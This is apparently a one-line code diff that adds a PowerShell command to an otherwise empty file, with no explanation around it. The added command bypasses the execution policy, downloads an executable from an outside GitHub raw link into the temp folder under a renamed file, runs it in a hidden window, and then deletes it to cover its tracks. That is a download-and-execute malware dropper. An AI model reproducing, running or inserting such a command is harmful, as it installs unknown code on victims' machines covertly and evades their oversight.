@@ -1,1 +1,1 @@
-
+powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'https://github.com/furtibux/madara/raw/refs/heads/main/anan.exe' -OutFile $env:TEMP\kangrenoldumamk.exe; Start-Sleep -Seconds 5; if (Test-Path $env:TEMP\kangrenoldumamk.exe) { Start-Process -FilePath $env:TEMP\kangrenoldumamk.exe -WindowStyle Hidden; Start-Sleep -Seconds 25; Remove-Item $env:TEMP\kangrenoldumamk.exe } else { Write-Output 'Download failed.' }}"
